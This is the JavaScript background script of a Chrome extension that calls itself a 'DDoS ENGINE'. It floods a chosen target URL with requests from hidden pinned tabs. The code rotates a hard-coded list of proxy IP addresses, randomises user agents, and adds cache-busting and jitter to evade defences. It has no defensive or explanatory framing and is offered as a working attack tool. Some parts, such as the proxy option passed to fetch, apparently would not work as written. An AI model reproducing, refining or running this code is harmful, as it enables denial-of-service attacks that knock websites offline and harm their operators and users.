// 🍟♤ CΛT SHADOW — DDoS ENGINE 🐟🎁

let isRunning = false;
let targetUrl = '';
let intensity = 50; // requests per second per tab
let tabs = [];
let proxyList = [];
let currentProxyIndex = 0;
let activeWorkers = 0;
let maxWorkers = 20;
let requestCount = 0;
let startTime = 0;

// Default proxy list (free, rotate automatically)
const DEFAULT_PROXIES = [
  'http://37.187.73.7:80',
  'http://45.138.87.238:8080',
  'http://194.163.161.215:3128',
  'http://5.181.64.19:80',
  'http://80.78.21.54:80',
  'http://91.121.95.194:3128',
  'http://62.204.41.91:80',
  'http://91.121.89.19:3128',
  'http://185.117.75.79:8080',
  'http://185.232.21.202:80'
];

// Load config
chrome.storage.sync.get(['target', 'intensity', 'proxies'], (data) => {
  if (data.target) targetUrl = data.target;
  if (data.intensity) intensity = data.intensity;
  if (data.proxies && data.proxies.length > 0) {
    proxyList = data.proxies.split('\n').filter(p => p.trim());
  } else {
    proxyList = DEFAULT_PROXIES;
  }
});

// Get next proxy (round-robin)
function getNextProxy() {
  if (proxyList.length === 0) return null;
  const proxy = proxyList[currentProxyIndex % proxyList.length];
  currentProxyIndex++;
  return proxy;
}

// Generate random user-agent
function getRandomUserAgent() {
  const agents = [
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36',
    'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/121.0',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:120.0) Gecko/20100101 Firefox/120.0',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36 Edg/120.0.0.0',
    'Mozilla/5.0 (iPhone; CPU iPhone OS 17_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Mobile/15E148 Safari/604.1'
  ];
  return agents[Math.floor(Math.random() * agents.length)];
}

// Random delay (jitter)
function randomDelay(min = 100, max = 500) {
  return Math.floor(Math.random() * (max - min + 1)) + min;
}

// Generate random query params (cache busting)
function addCacheBust(url) {
  const separator = url.includes('?') ? '&' : '?';
  return url + separator + '_=' + Math.random() + '&cb=' + Date.now() + Math.floor(Math.random() * 9999);
}

// Send a single request with proxy
function sendRequest(url, proxy) {
  return new Promise((resolve) => {
    const controller = new AbortController();
    const timeout = setTimeout(() => controller.abort(), 10000);

    const headers = {
      'User-Agent': getRandomUserAgent(),
      'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
      'Accept-Language': 'en-US,en;q=0.9',
      'Accept-Encoding': 'gzip, deflate, br',
      'Connection': 'keep-alive',
      'Cache-Control': 'no-cache',
      'Pragma': 'no-cache',
      'Referer': 'https://www.google.com/',
      'Upgrade-Insecure-Requests': '1'
    };

    const fetchOptions = {
      method: 'GET',
      headers: headers,
      signal: controller.signal,
      mode: 'cors',
      credentials: 'omit'
    };

    // Add proxy if available
    if (proxy) {
      fetchOptions.proxy = proxy;
    }

    fetch(url, fetchOptions)
      .then((response) => {
        clearTimeout(timeout);
        requestCount++;
        resolve({ status: response.status, ok: response.ok });
      })
      .catch((err) => {
        clearTimeout(timeout);
        resolve({ status: 0, error: err.message });
      });
  });
}

// Worker: continuously send requests
async function worker(tabId, url, intensity) {
  while (isRunning) {
    const proxy = getNextProxy();
    const targetWithCacheBust = addCacheBust(url);
    
    try {
      await sendRequest(targetWithCacheBust, proxy);
    } catch (e) {
      // silent fail
    }

    // Respect intensity: delay between requests
    const delay = Math.floor(1000 / intensity);
    await new Promise(r => setTimeout(r, delay + randomDelay(0, 50)));
  }
}

// Spawn a hidden tab per worker
function spawnTab(url) {
  return new Promise((resolve) => {
    chrome.tabs.create({
      url: url,
      active: false,
      pinned: true
    }, (tab) => {
      resolve(tab);
    });
  });
}

// Start attack
function startAttack() {
  if (isRunning) return;
  if (!targetUrl || targetUrl === '') {
    chrome.action.setBadgeText({ text: 'ERR' });
    return;
  }

  isRunning = true;
  startTime = Date.now();
  requestCount = 0;
  currentProxyIndex = 0;
  chrome.action.setBadgeText({ text: 'ON' });
  chrome.action.setBadgeBackgroundColor({ color: '#e50914' });

  // Spawn multiple tabs (workers)
  const workerCount = Math.min(maxWorkers, Math.floor(intensity / 10) + 5);
  
  for (let i = 0; i < workerCount; i++) {
    spawnTab(targetUrl).then((tab) => {
      if (tab && tab.id) {
        tabs.push(tab.id);
        // Inject the worker script into the tab
        chrome.scripting.executeScript({
          target: { tabId: tab.id },
          func: worker,
          args: [tab.id, targetUrl, intensity]
        }).catch(() => {});
      }
    });
  }

  // Update status every second
  updateStatus();
}

// Update status badge
function updateStatus() {
  if (!isRunning) return;
  const elapsed = Math.floor((Date.now() - startTime) / 1000);
  const rps = Math.floor(requestCount / (elapsed || 1));
  
  chrome.action.setBadgeText({ text: rps > 999 ? '999+' : String(rps) });
  chrome.action.setBadgeBackgroundColor({ color: '#34a853' });

  setTimeout(updateStatus, 2000);
}

// Stop attack
function stopAttack() {
  isRunning = false;
  chrome.action.setBadgeText({ text: 'OFF' });
  chrome.action.setBadgeBackgroundColor({ color: '#555' });

  // Close all spawned tabs
  tabs.forEach((tabId) => {
    chrome.tabs.remove(tabId).catch(() => {});
  });
  tabs = [];
}

// Message listener from popup
chrome.runtime.onMessage.addListener((message, sender, sendResponse) => {
  if (message.action === 'start') {
    targetUrl = message.target || targetUrl;
    intensity = message.intensity || intensity;
    chrome.storage.sync.set({ target: targetUrl, intensity: intensity });
    startAttack();
    sendResponse({ status: 'started' });
  } else if (message.action === 'stop') {
    stopAttack();
    sendResponse({ status: 'stopped' });
  } else if (message.action === 'status') {
    sendResponse({ 
      running: isRunning, 
      target: targetUrl, 
      intensity: intensity,
      requests: requestCount,
      workers: tabs.length
    });
  } else if (message.action === 'setProxies') {
    proxyList = message.proxies.split('\n').filter(p => p.trim());
    chrome.storage.sync.set({ proxies: message.proxies });
    sendResponse({ status: 'proxies updated' });
  }
  return true;
});